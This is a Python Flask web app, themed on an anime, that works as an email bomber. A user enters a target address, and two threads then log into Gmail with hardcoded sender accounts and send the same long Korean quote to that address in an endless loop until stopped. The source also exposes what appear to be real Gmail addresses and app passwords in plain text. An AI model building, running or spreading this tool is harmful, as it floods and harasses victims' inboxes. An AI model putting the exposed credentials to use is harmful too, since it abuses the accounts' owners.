import smtplib
from email.mime.text import MIMEText
from flask import Flask, request, render_template_string
import threading
import time
import re

SMTP_SERVER = 'smtp.gmail.com'
SMTP_PORT = 587
SENDER_EMAIL = "blahblahblahaa11@gmail.com"
SENDER_PASSWORD = "oovu clin ujlr zngg"
SECOND_SENDER_EMAIL = "gihoyeon78@gmail.com"
SECOND_SENDER_PASSWORD = "xnll gvua vaxy yclt"

app = Flask(__name__)

is_running = False

def is_valid_email(email):
    pattern = r'^[\w\.-]+@[\w\.-]+\.\w+$'
    return re.match(pattern, email)

def send_email_loop(receiver_email, sender_email, sender_password):
    global is_running
    count = 0

    try:
        while is_running:
            with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
                server.starttls()
                server.login(sender_email, sender_password)

                count += 1

                msg = MIMEText(f"미안하다, 아마나이. 난 지금 널 위해 화를 내는게 아니야. 나는 아무도 미워하지 않아. 지금은 그저 한없이 이 세계가 유쾌하다. [천상천하, 유아독존!] 대대로 전해 내려오는 전수 술식의 이점은 선대가 미리 구축해놓은 술식의 취급설명서가 있다는 것. 단점은 술식의 정보가 쉽게 새어나간다는 것. 당신, 젠인 가의 사람이지? 그러니 '창'과 '혁' 그리고 무하한 주술에 대한 것도 잘 아는 거겠지. 하지만 이건, 고죠 가문 안에사도 극히 일부의 인간만 아는 것이다. 순전과 반전. 각각의 무한을 충돌시킴으로써 생성되고, 가상의 질량을 밀어내는 허식(虚式), 자(紫); 🫸🔵 🔴🫷 🫴🟣\n미안하다, 아마나이. 난 지금 널 위해 화를 내는게 아니야. 나는 아무도 미워하지 않아. 지금은 그저 한없이 이 세계가 유쾌하다. [천상천하, 유아독존!] 대대로 전해 내려오는 전수 술식의 이점은 선대가 미리 구축해놓은 술식의 취급설명서가 있다는 것. 단점은 술식의 정보가 쉽게 새어나간다는 것. 당신, 젠인 가의 사람이지? 그러니 '창'과 '혁' 그리고 무하한 주술에 대한 것도 잘 아는 거겠지. 하지만 이건, 고죠 가문 안에사도 극히 일부의 인간만 아는 것이다. 순전과 반전. 각각의 무한을 충돌시킴으로써 생성되고, 가상의 질량을 밀어내는 허식(虚式), 자(紫); 🫸🔵 🔴🫷 🫴🟣\n미안하다, 아마나이. 난 지금 널 위해 화를 내는게 아니야. 나는 아무도 미워하지 않아. 지금은 그저 한없이 이 세계가 유쾌하다. [천상천하, 유아독존!] 대대로 전해 내려오는 전수 술식의 이점은 선대가 미리 구축해놓은 술식의 취급설명서가 있다는 것. 단점은 술식의 정보가 쉽게 새어나간다는 것. 당신, 젠인 가의 사람이지? 그러니 '창'과 '혁' 그리고 무하한 주술에 대한 것도 잘 아는 거겠지. 하지만 이건, 고죠 가문 안에사도 극히 일부의 인간만 아는 것이다. 순전과 반전. 각각의 무한을 충돌시킴으로써 생성되고, 가상의 질량을 밀어내는 허식(虚式), 자(紫); 🫸🔵 🔴🫷 🫴🟣\n{count}")
                msg['From'] = sender_email
                msg['To'] = receiver_email
                msg['Subject'] = (f"영역전개: 무량공처\n{count}")

                server.sendmail(sender_email, receiver_email, msg.as_string())

            print(f"{count} 번째 전송 완료 ({sender_email})")

    except Exception as e:
        print("오류:", e)

    is_running = False


html = '''
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>무량공처</title>
<style>
body {
    margin: 0;
    height: 100vh;
    display: flex;
    justify-content: center;
    align-items: center;
    background: linear-gradient(135deg, #0f0f0f, #1a1a2e);
    font-family: 'Segoe UI', sans-serif;
    color: white;
}

.container {
    background: rgba(255,255,255,0.05);
    backdrop-filter: blur(15px);
    padding: 40px;
    border-radius: 20px;
    box-shadow: 0 0 40px rgba(128, 0, 255, 0.4);
    text-align: center;
    width: 380px;
}

h1 {
    margin-bottom: 25px;
    font-weight: 600;
    letter-spacing: 2px;
}

input[type="email"] {
    width: 100%;
    padding: 12px;
    border-radius: 10px;
    border: none;
    outline: none;
    margin-bottom: 20px;
    background: rgba(255,255,255,0.1);
    color: white;
    font-size: 14px;
}

input[type="email"]::placeholder {
    color: rgba(255,255,255,0.6);
}

button {
    width: 100%;
    padding: 12px;
    border-radius: 10px;
    border: none;
    font-size: 14px;
    cursor: pointer;
    margin-top: 10px;
    transition: 0.2s ease-in-out;
}

button[value="start"] {
    background: linear-gradient(90deg, #6a00ff, #b300ff);
    color: white;
}

button[value="start"]:hover {
    transform: scale(1.05);
    box-shadow: 0 0 15px #b300ff;
}

button[value="stop"] {
    background: linear-gradient(90deg, #ff003c, #ff4d6d);
    color: white;
}

button[value="stop"]:hover {
    transform: scale(1.05);
    box-shadow: 0 0 15px #ff4d6d;
}

.status {
    margin-top: 20px;
    font-size: 14px;
    opacity: 0.9;
}

.target {
    margin-top: 10px;
    font-size: 13px;
    color: #c77dff;
}
</style>
</head>
<body>
<div class="container">
    <h1>무량공처</h1>
    <form method="POST">
        <input type="email" name="email" placeholder="대상 이메일 입력" value="{{email}}" required>
        <button name="action" value="start">영역 전개</button>
        <button name="action" value="stop">영역 해제</button>
    </form>
    <div class="status">
        영역{{status}}
    </div>
    {% if email %}
    <div class="target">
        최근 술식 대상: {{email}}
    </div>
    {% endif %}
</div>
</body>
</html>
'''

@app.route('/', methods=['GET','POST'])
def index():
    global is_running
    status = "대기중"
    email = ""

    if request.method == 'POST':
        action = request.form['action']
        email = request.form.get('email', '')

        if action == "start":
            if is_valid_email(email):
                if not is_running:
                    is_running = True

                    threading.Thread(
                        target=send_email_loop,
                        args=(email, SENDER_EMAIL, SENDER_PASSWORD)
                    ).start()

                    threading.Thread(
                        target=send_email_loop,
                        args=(email, SECOND_SENDER_EMAIL, SECOND_SENDER_PASSWORD)
                    ).start()

                status = "전개중"
            else:
                status = "이메일 형식 오류"

        elif action == "stop":
            is_running = False
            status = " 해제됨"

    if is_running:
        status = "전개 완료"

    return render_template_string(html, status=status, email=email)
    
if __name__ == '__main__':
    app.run(debug=True)